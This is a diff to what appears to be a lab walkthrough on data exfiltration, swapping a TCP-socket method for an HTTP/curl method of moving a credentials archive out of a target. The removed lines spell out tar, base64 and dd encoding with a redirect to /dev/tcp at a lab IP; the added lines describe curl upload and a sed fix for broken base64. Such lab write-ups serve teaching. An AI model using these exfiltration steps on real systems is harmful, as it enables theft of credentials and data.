@@ -10,14 +10,14 @@ Create a PHP file that handles data pass to the webserver:
   <img src="./imgs/code.png"/>
 </p><br/>
 <b>Step 2: Transfer Data</b><br />
-Next, we'll create an archive of the file using <i>tar zcf</i>, then we'll use <i>base64</i> to encode the data, lastly we'll create a backup <i>dd conv=ebcdic</i> and transfer it using TCP socket <i> > /dev/tcp/10.10.155.2/8080</i>: 
+Now we can transfer the data using the curl command from the target system: 
 <p align="center">
-  <img src="./imgs/data_transfer.png"/>
+  <img src="./imgs/curl_transfer.png"/>
 </p><br/>
-<b>Step 3: Decode and Extract the Content</b><br />
-Finally, we'll convert the file to ascii <i>dd conv=ascii if=task4-creds.data</i>, decode the base64 <i>base64 -d > task4-creds.data.tar</i>. Lastly
+<b>Step 3: Edit and Decode the Content</b><br />
+When data is passed through HTTP the data becomes URL encode which leaves us with broken Base64 encoding. The <i>sed</i> command will replace all the spaces with + symbols, making it valid Base64. Then we can decode it to view the content:
 <p align="center">
-  <img src="./imgs/view_tcp_content.png"/>
+  <img src="./imgs/view_http_content.png"/>
 </p><br/>
 
 
